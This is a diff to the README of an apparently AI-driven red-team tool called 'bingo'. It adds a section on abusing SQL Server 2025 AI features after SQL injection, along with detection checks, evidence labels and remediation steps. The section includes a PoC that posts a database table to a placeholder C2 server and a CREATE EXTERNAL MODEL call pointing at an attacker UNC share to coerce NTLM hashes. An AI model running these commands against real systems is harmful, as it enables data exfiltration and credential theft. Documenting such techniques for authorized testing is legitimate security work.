@@ -192,6 +192,68 @@ INFERRED  = structural pattern match only
 
 ---
 
+### MSSQL 2025 AI Feature Exploitation (v2.1)
+
+> **Research basis:** [SpecterOps — "Oops, I Weaponized the Database: Abusing AI Features in SQL Server 2025"](https://specterops.io/blog/2026/06/10/oops-i-weaponized-the-database-abusing-ai-features-in-mssql-2025/)
+
+SQL Server 2025 introduced native AI capabilities that create entirely new attack surfaces. bingo automatically detects these conditions and generates exploitation PoCs when all three prerequisites are met.
+
+**AI auto-trigger conditions (all three must be confirmed):**
+
+| Condition | How bingo checks |
+|-----------|-----------------|
+| Target runs SQL Server 2025 | `@@version` injection or version string in error response |
+| SQL injection allows stacked queries | `WAITFOR DELAY '0:0:3'` — response delay ≥ 2.5 s = confirmed |
+| DB account has elevated privileges | `IS_SRVROLEMEMBER('sysadmin')` time-based check |
+
+If any condition is not met, the module is automatically skipped — no false positives, no impact on other DB engines (MySQL, PostgreSQL, Oracle).
+
+**Exploitation techniques (PoC generation only — not auto-executed):**
+
+| Technique | Attack primitive | Impact |
+|-----------|-----------------|--------|
+| `sp_invoke_external_rest_endpoint` | POST entire DB tables to attacker server | Full data exfiltration (up to 100 MB) |
+| `CREATE EXTERNAL MODEL` (UNC path) | Load model from `\\attacker-ip\share` → NTLM coercion | Admin password hash capture |
+| `AI_GENERATE_EMBEDDINGS` (UNC path) | Same UNC trick via embedding model | Covert C2 channel / NTLM relay |
+
+**Generated PoC example:**
+
+```sql
+-- Enable REST endpoint
+EXEC sp_configure 'external rest endpoint enabled', 1; RECONFIGURE;
+
+-- Exfiltrate users table to attacker server
+DECLARE @p NVARCHAR(MAX);
+SELECT @p = (SELECT * FROM dbo.users FOR JSON AUTO);
+EXEC sp_invoke_external_rest_endpoint
+    @url = N'https://YOUR-C2/collect',
+    @method = 'POST',
+    @payload = @p;
+
+-- NTLM hash coercion via external model
+CREATE EXTERNAL MODEL ntlm_bait WITH (
+    LOCATION = '\\YOUR-ATTACKER-IP\share',
+    API_FORMAT = 'ONNX Runtime',
+    MODEL_TYPE = EMBEDDINGS,
+    MODEL = 'capture'
+);
+```
+
+**Evidence labeling:**
+```
+VERIFIED  = WAITFOR DELAY confirmed stacked query + version string confirmed
+LIKELY    = MSSQL error detected but version unconfirmed
+INFERRED  = MSSQL fingerprint only, stacked queries not tested
+```
+
+**Remediation (auto-included in report):**
+1. `EXEC sp_configure 'external rest endpoint enabled', 0; RECONFIGURE;`
+2. Block outbound connections from the SQL Server host at the firewall
+3. Remove `sysadmin` privilege from the application DB account
+4. Apply SQL injection patch (Parameterized Query)
+
+---
+
 ### ACPV — Client-Side Authentication Bypass (v2.1)
 
 bingo automatically detects and exploits client-side authentication vulnerabilities — no password needed.
@@ -308,7 +370,7 @@ Full AI responses, commands, and results are logged in real time.
 
 220+ red team skills across 41 modules — automatically injected into AI context based on your input. Use `/skill <keyword>` to search.
 
-**Modules include:** Reconnaissance, Exploitation, Privilege Escalation, Post-Exploitation, Lateral Movement, Persistence, Cloud Security, Mobile Security, LLM/AI Security, Blockchain/Web3, Ransomware Defense, **Client-Side Auth Bypass (ACPV)**, **API Discovery & AI Fuzzing**, and more.
+**Modules include:** Reconnaissance, Exploitation, Privilege Escalation, Post-Exploitation, Lateral Movement, Persistence, Cloud Security, Mobile Security, LLM/AI Security, Blockchain/Web3, Ransomware Defense, **Client-Side Auth Bypass (ACPV)**, **API Discovery & AI Fuzzing**, **MSSQL 2025 AI Exploitation**, and more.
 
 ---
 
@@ -472,7 +534,7 @@ bingo/
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **41 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41)
+- **42 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42)
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
